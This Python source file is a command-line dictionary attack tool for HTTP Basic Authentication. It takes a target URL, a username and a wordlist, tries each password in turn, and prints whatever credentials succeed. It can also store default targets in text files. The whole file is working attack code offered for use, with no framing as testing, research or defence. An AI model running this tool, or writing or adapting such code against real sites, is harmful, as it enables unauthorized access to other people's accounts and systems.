#!/usr/bin/python3

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

try:
    import requests
    from requests.auth import HTTPBasicAuth
except:
    pass
    print(bcolors.BOLD + bcolors.FAIL + ("[-] This program requires the 'requests' module!"+ bcolors.ENDC))
    exit()

import os
import socket
import os.path
import sys
import apt
import time

title = bcolors.OKGREEN + bcolors.BOLD + """
  ___ ___   __    __        ___________
 /   |   \_/  |__/  |_______\_   _____/__________   ____  ____
/    ~    \   __|   __|____ ||    __)/  _ \_  __ |_/ ___|/ __ |
\    Y    /|  |  |  | |  |_> >     \(  <_> )  | \/\  \__\  ___/
 \___|_  / |__|  |__| |   __/\___  / \____/|__|    \___  >___  >
       \/             |__|       \/                    \/    \/
""" + bcolors.ENDC
print(title)
print("\033[1;37;41m HTTP Basic Auth Bruteforce - V 1.0 - Author: @christhehacker IG \033[0m ")
def keyInterruptFunction():
    print(bcolors.FAIL + bcolors.BOLD + ("\n[-] User requested an interrupt - shutting down!") + bcolors.ENDC)
    sys.exit()


def checkOnline(): # Check if target site is online
    with requests.Session() as s:
        try:
            p = s.post('%s' % (loginURL))
        except:
            print (bcolors.FAIL + bcolors.BOLD + ("[-] Error: The site provided is not online/available.") + bcolors.ENDC)
            getLogin()

def getLogin():
    try:
        global loginURL
        loginURL = input(bcolors.BOLD + bcolors.OKGREEN + ("[*] Target URL: ") + bcolors.ENDC)
        checkOnline()
    except KeyboardInterrupt:
        keyInterruptFunction()

def getUsername():
    try:
        global usernameChoice
        usernameChoice = input(bcolors.BOLD + bcolors.OKGREEN + ("[*] Username to login with: ") + bcolors.ENDC)

    except KeyboardInterrupt:
        keyInterruptFunction()

def getWordlist():
    try:
        global wordlist
        wordlist = input(bcolors.BOLD + bcolors.OKGREEN + ("[*] Wordlist to use: ") + bcolors.ENDC)
        if (os.path.isfile(wordlist)):
            pass
        else:
            print(bcolors.FAIL + bcolors.BOLD + ("[-] Error - '%s' is not a file!" % (wordlist)) + bcolors.ENDC)
            getWordlist()

    except KeyboardInterrupt:
        keyInterruptFunction()


def basicStatusCode():
    import subprocess
    StatusCode = bcolors.BOLD + bcolors.FAIL + "[-] Failed - " + bcolors.WARNING + ("Status code: ") + str(basic.status_code) + bcolors.ENDC
    print (StatusCode)
    stringCode = str(basic.status_code)


def basicSuccess():
    print (bcolors.OKGREEN + bcolors.BOLD + ("[+] Success!")+ bcolors.ENDC)
    print(bcolors.OKGREEN + bcolors.BOLD + ("\n[+] URL: ") + bcolors.ENDC + (loginURL))
    print(bcolors.OKGREEN + bcolors.BOLD + ("[+] Credentials: ") + bcolors.ENDC + ("%s:%s\n" % (usernameChoice,passwordAttempt)))
    exit()


def testSubmit():
    try:
        basic = requests.get("%s" % (loginURL), auth=HTTPBasicAuth('%s' % (usernameChoice), '%s' % ("00TESTPASSWORD00")))
        if ("unauthorized" in basic.text) or ("Unauthorized" in basic.text) or ("do not have" in basic.text):
            pass

        elif basic.text == (""):
            print(bcolors.FAIL + bcolors.BOLD + ("[-] Error: The page response is blank..."))
            print("[-] This page cannot be attacked because there is no response to read." + (bcolors.ENDC))
            sys.exit(1)

        elif (http.client.RemoteDisconnected == True):
            exit()

        else:
            print(bcolors.BOLD + bcolors.FAIL + ("[-] Page is giving false positives. This URL cannot be attacked."+ bcolors.ENDC))
            print(bcolors.BOLD + bcolors.FAIL + ("[-] Are you sure this is an HTTP Basic Authentication page?"+ bcolors.ENDC))

    except requests.exceptions.ConnectionError:
        print(bcolors.BOLD + bcolors.FAIL + ("[-] Requests aren't sending...The site may be blocking the requests.."+ bcolors.ENDC))
        exit()

def basicBruteforce():
    global basic
    print(bcolors.BOLD + bcolors.OKGREEN + ("\n[+] Launching attack against %s" % (loginURL)) + bcolors.ENDC)
    print(bcolors.WARNING + bcolors.BOLD + ("[*] Expect 401 errors!") + bcolors.ENDC)
    testSubmit() # Test whether or not submissions are working properly
    global p
    p = open(wordlist, encoding = "ISO-8859-1")
    global passwordAttempt
    for line in p.readlines():
        try:
            passwordAttempt = str(line.strip())
            basic = requests.get("%s" % (loginURL), auth=HTTPBasicAuth('%s' % (usernameChoice), '%s' % (passwordAttempt)))
            print("\n[*] Trying:  (%s:%s)" % (usernameChoice,passwordAttempt))

            if ("unauthorized" in basic.text) or ("Unauthorized" in basic.text) or ("do not have" in basic.text):
                basicStatusCode()

            else:
                basicSuccess()
                exit()

        except KeyboardInterrupt:
            keyInterruptFunction()


Menu = bcolors.BOLD + ("""
        1) Dictionary attack HTTP Basic Authentication Page
        2) Use preconfigured options

""") + bcolors.ENDC

def MainScreen():
    print (Menu)
    try:
        ChoiceOne = input(bcolors.BOLD + bcolors.OKGREEN + ("[*] Select an option > ") + bcolors.ENDC)
        if (ChoiceOne == "1"):
            getLogin()
            getWordlist()
            getUsername()
            #getTor()
            basicBruteforce()

        elif (ChoiceOne == "2"):
            global wordlist
            global usernameChoice
            if os.path.isfile("SiteForceUser.txt") and os.path.isfile("SiteForceWordlist.txt"):
                with open('SiteForceWordlist.txt','r') as w:
                    for line in w:
                        for wordlist in line.split():
                            print("[+] Wordlist: %s" % (wordlist))


                            with open("SiteForceUser.txt","r") as u:
                                for line in u:
                                    for usernameChoice in line.split():
                                        print("[+] Username: %s" % (usernameChoice))
                                        getLogin()
                                        basicBruteforce()

            else:
                print("This option allows you to attack devices using pre-set options. ")
                print("You will not have to enter wordlist and username every time.")
                configurePrompt = input("[*] Configure now? > ")
                if (configurePrompt == "y") or (configurePrompt == "yes"):
                    try:
                        UsernameFile = input("[*] Username to set as default: ")
                        WordlistFile = input("[*] Wordlist to set as default: ")
                        f= open("SiteForceUser.txt","w+")
                        f.write("%s \r\n" % (UsernameFile))
                        f.close()
                        f = open("SiteForceWordlist.txt", "w+")
                        f.write("%s \r\n" % (WordlistFile))
                        f.close()
                        print("[+] Files SiteForceUser.txt and SiteForceWordlist have been generated.")
                        print("[+] Select option 2 again to use them.")
                        MainScreen()
                    except KeyboardInterrupt:
                        keyInterruptFunction()

        else:
            print(bcolors.BOLD + bcolors.FAIL + ("[-] Please choose an option 1-2!") + bcolors.ENDC)
            MainScreen()

    except KeyboardInterrupt:
        keyInterruptFunction()

MainScreen()
